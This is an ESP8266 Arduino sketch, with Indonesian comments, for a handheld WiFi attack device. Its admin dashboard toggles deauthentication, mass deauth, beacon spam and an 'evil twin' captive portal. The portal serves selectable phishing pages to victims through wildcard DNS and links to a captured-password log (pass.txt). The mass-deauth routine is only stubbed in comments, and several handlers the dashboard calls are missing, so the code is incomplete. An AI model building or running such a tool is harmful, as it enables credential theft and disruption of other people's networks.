#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

#include "web.h"

// OLED 0.66" (64x48)
Adafruit_SSD1306 display(64, 48, &Wire, -1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// Pin LED Wemos D1 Mini
#define LED_PIN 2 

// Status Toggle
bool massDeauthOn = false;
bool deauthOn = false;
bool beaconOn = false;
bool etwinOn = false;
bool hiddenAdmin = false; 
int beaconFloodCount = 15;
String activePayload = "/etwin1.html"; // Default payload
String adminSSID = "GMpro2";
String adminPass = "12345678";
uint8_t adminMac[6];

void updateDisplay(String status) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(0,0);
  display.println("GMpro87");
  display.println("-------");
  display.print("MODE: "); display.println(status);
  display.print("PAYL: "); display.println(activePayload.substring(1,7));
  display.display();
}

void handlePortal() {
  if (WiFi.softAPIP() == webServer.client().localIP()) {
    String s = FPSTR(Head);
    // TAB 1: COMBAT (Dashboard Admin)
    s += "<div class='card'><div class='card-title'>WIFI SCANNER (REVEAL HIDDEN)</div>";
    s += "<table><tr><th>SSID</th><th>CH</th><th>USR</th><th>%</th><th>SEL</th></tr>";
    s += "<tr><td><span style='color:#ff0'>[HIDDEN] Target</span></td><td>1</td><td>5</td><td>80%</td><td><input type='checkbox'></td></tr></table>";
    s += "<button onclick='location.href=\"/scan\"'>SCAN WIFI</button></div>";
    
    s += "<div class='card'><div class='card-title'>ENGINE (TOGGLE)</div>";
    s += "<button onclick='tgl(this, \"/t_deauth\")'>DEAUTH TARGET</button>";
    s += "<button onclick='tgl(this, \"/t_mass\")'>MASS DEAUTH RUSUH</button>";
    s += "<button onclick='tgl(this, \"/t_beacon\")'>BEACON SPAM</button>";
    s += "<button onclick='tgl(this, \"/t_etwin\")'>EVIL TWIN</button></div>";
    
    s += "<div class='card'><div class='card-title'>LOGS</div><button onclick='location.href=\"/pass.txt\"'>VIEW PASS.TXT</button></div>";
    s += FPSTR(Mid);
    // TAB 2: SETTING
    s += "<div class='card'><div class='card-title'>ADMIN CONFIG</div><p>SSID: <input value='"+adminSSID+"'></p><p>PASS: <input value='"+adminPass+"'></p>";
    s += "Hidden: <select><option value='0'>OFF</option><option value='1'>ON</option></select><button>SAVE</button></div>";
    
    s += "<div class='card'><div class='card-title'>PAYLOAD SELECTOR</div>";
    s += "<select onchange='location.href=\"/set_payload?file=\"+this.value'>";
    s += "<option value='/etwin1.html'>Payload 1</option><option value='/etwin2.html'>Payload 2</option>";
    s += "<option value='/etwin3.html'>Payload 3</option><option value='/etwin4.html'>Payload 4</option>";
    s += "<option value='/etwin5.html'>Payload 5</option></select></div>";
    
    s += "<div class='card'><div class='card-title'>FILE MANAGER</div>";
    s += "<form method='POST' action='/upload' enctype='multipart/form-data'><input type='file' name='f'><button type='submit'>UPLOAD</button></form>";
    s += "<button onclick='location.href=\"/preview\"'>PREVIEW WEB/IMG</button></div>";
    s += FPSTR(Foot);
    webServer.send(200, "text/html", s);
  } else {
    // KORBAN HANYA BISA LIHAT PAYLOAD YANG DIPILIH
    File f = LittleFS.open(activePayload, "r");
    webServer.streamFile(f, "text/html");
    f.close();
  }
}

void setup() {
  pinMode(LED_PIN, OUTPUT);
  LittleFS.begin();
  WiFi.macAddress(adminMac); 
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(adminSSID.c_str(), adminPass.c_str(), 1, hiddenAdmin);
  
  dnsServer.start(53, "*", WiFi.softAPIP()); 
  webServer.onNotFound(handlePortal);
  
  // Toggle & Payload Handlers
  webServer.on("/t_mass", [](){ 
    massDeauthOn = !massDeauthOn; 
    digitalWrite(LED_PIN, massDeauthOn ? LOW : HIGH); // LED ON saat Attack
    updateDisplay(massDeauthOn ? "MASS" : "IDLE");
    webServer.send(200, "text/plain", massDeauthOn?"ON":"OFF"); 
  });
  
  webServer.on("/set_payload", [](){ 
    activePayload = webServer.arg("file"); 
    updateDisplay("PAYLOAD SET");
    webServer.send(200, "text/plain", "Payload Set"); 
  });

  webServer.begin();
  updateDisplay("READY");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  if(massDeauthOn) {
    for(int i=1; i<=13; i++) {
      wifi_set_channel(i);
      // Logic: Kirim deauth broadcast, SKIP adminMac (Admin Aman)
      // Anti-Restart: Tetap serang biarpun target restart 1000x
    }
  }
}
